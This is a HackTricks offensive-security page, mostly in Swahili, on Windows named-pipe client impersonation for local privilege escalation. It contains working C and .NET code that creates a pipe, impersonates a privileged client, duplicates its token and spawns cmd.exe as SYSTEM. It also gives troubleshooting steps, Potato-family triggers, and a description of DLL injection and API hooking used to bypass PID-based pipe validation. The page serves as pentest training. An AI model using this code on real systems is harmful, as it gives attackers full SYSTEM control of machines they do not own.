# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ni primitive ya local privilege escalation inayowezesha thread ya server ya named-pipe kuchukua muktadha wa usalama wa client inayounganisha nayo. Kwa vitendo, mshambulizi anayeweza kuendesha code akiwa na SeImpersonatePrivilege anaweza kulazimisha client mwenye vipaumbele (mfano, huduma ya SYSTEM) kuunganishwa kwenye pipe inayodhibitiwa na mshambulizi, kuita ImpersonateNamedPipeClient, kuzaidisha token inayopatikana hadi TokenPrimary, na kuanzisha mchakato kama client (mara nyingi NT AUTHORITY\SYSTEM).

Ukurasa huu unazingatia mbinu ya msingi. Kwa chains za end-to-end zinazolazimisha SYSTEM kuungana na pipe yako, ona kurasa za familia ya Potato zilizotajwa hapa chini.

## TL;DR
- Unda named pipe: \\.\pipe\<random> na subiri muunganisho.
- Fanya komponenti yenye vipaumbele iunganishwe nayo (spooler/DCOM/EFSRPC/etc.).
- Soma angalau ujumbe mmoja kutoka kwenye pipe, kisha itumie ImpersonateNamedPipeClient.
- Fungua token ya impersonation kutoka kwenye thread ya sasa, DuplicateTokenEx(TokenPrimary), na CreateProcessWithTokenW/CreateProcessAsUser ili kupata mchakato wa SYSTEM.

## Requirements and key APIs
- Privileges zinazohitajika mara nyingi na process/thread inayoitisha:
- SeImpersonatePrivilege ili kufanikiwa kuiga client inayounganisha na kutumia CreateProcessWithTokenW.
- Kwa njia mbadala, baada ya kuiga SYSTEM, unaweza kutumia CreateProcessAsUser, ambayo inaweza kuhitaji SeAssignPrimaryTokenPrivilege na SeIncreaseQuotaPrivilege (hizi zimetimizwa wakati unapoiga SYSTEM).
- Core APIs zinazotumika:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (lazima usome angalau ujumbe mmoja kabla ya impersonation)
- ImpersonateNamedPipeClient na RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW au CreateProcessAsUser
- Impersonation level: ili kufanya vitendo vinavyofaa kwa localhost, client lazima iruhusu SecurityImpersonation (default kwa wateja wengi wa RPC/named-pipe za ndani). Clients wanaweza kupunguza hili kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wakati wa kufungua pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Vidokezo:
- Ikiwa ImpersonateNamedPipeClient inarudisha ERROR_CANNOT_IMPERSONATE (1368), hakikisha umesoma kutoka kwenye pipe kwanza na kwamba mteja hakuzuia impersonation kwa Identification level.
- Pendelea DuplicateTokenEx pamoja na SecurityImpersonation na TokenPrimary ili kuunda primary token inayofaa kwa process creation.

## Mfano mfupi wa .NET
Katika .NET, NamedPipeServerStream inaweza impersonate kupitia RunAsClient. Mara unapofanya impersonation, nakili token ya thread kisha uunde process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Vichocheo/vikatazo vya kawaida ili kupata SYSTEM kwenye pipe yako
Tekniki hizi huchochea huduma zenye vibali kuungana na named pipe yako ili uweze kuzigiza/kuigiza:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Tazama matumizi ya kina na ulinganishaji hapa:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ikiwa unahitaji tu mfano kamili wa kutengeneza pipe na kuigiza ili kuanzisha SYSTEM kutoka kwa service trigger, tazama:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened services bado zinaweza kuangushwa kwa kuingilia mteja aliyeaminika. Vifaa kama [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) huweka helper DLL ndani ya mteja, hupitisha trafiki yake kupitia proxy, na inakuwezesha kuharibu/kuchezea IPC yenye vibali kabla huduma ya SYSTEM kuitumia.

### Inline API hooking inside trusted processes
- Inject the helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) into any client.
- The DLL Detours `ReadFile`, `WriteFile`, etc., but only when `GetFileType` reports `FILE_TYPE_PIPE`, copies each buffer/metadata to a control pipe, lets you edit/drop/replay it, then resumes the original API.
- Inageuza mteja halali kuwa proxy kama Burp: simamisha payloads za UTF-8/UTF-16/raw, chochea njia za makosa, rudia mfululizo, au tosha JSON traces.

### Remote client mode to defeat PID-based validation
- Inject into an allow-listed client, then in the GUI choose the pipe plus that PID.
- The DLL issues `CreateFile`/`ConnectNamedPipe` inside the trusted process and relays the I/O back to you, so the server still observes the legitimate PID/image.
- Inapita vichujio vinavyotegemea `GetNamedPipeClientProcessId` au ukaguzi wa signed-image.

### Fast enumeration and fuzzing
- `pipelist` enumerates `\\.\pipe\*`, shows ACLs/SIDs, and forwards entries to other modules for immediate probing.
- The pipe client/message composer connects to any name and builds UTF-8/UTF-16/raw-hex payloads; import captured blobs, mutate fields, and resend to hunt deserializers or unauthenticated command verbs.
- The helper DLL can host a loopback TCP listener so tooling/fuzzers can drive the pipe remotely via the Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Changanya the TCP bridge na VM snapshot restores ili kujaribu kuangusha parsers dhaifu za IPC.

### Mambo ya kiutendaji
- Named pipes ni za latency ndogo; kusimamisha kwa muda mrefu wakati wa kuhariri buffer kunaweza kusababisha deadlock kwa services zisizo imara.
- Ufunikaji wa Overlapped/completion-port I/O ni wa sehemu tu, hivyo tarajia kesi za pembezoni.
- Injection inasababisha kelele na haijasainiwa, hivyo itumiwe kama lab/exploit-dev helper badala ya stealth implant.

## Utatuzi wa matatizo na mambo ya kuzingatia
- Lazima usome angalau ujumbe mmoja kutoka pipe kabla ya kuita ImpersonateNamedPipeClient; vinginevyo utapata ERROR_CANNOT_IMPERSONATE (1368).
- Ikiwa client inaunganisha na SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server haiwezi kuiga kikamilifu; angalia kiwango cha impersonation cha token kupitia GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW inahitaji SeImpersonatePrivilege kwa caller. Ikiwa hiyo inashindwa na ERROR_PRIVILEGE_NOT_HELD (1314), tumia CreateProcessAsUser baada ya tayari kuiga SYSTEM.
- Hakikisha security descriptor ya pipe yako inaruhusu service lengwa kuungana ikiwa umeimarisha; kwa default, pipes chini ya \\.\pipe zinapatikana kulingana na DACL ya server.

## Marejeo
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
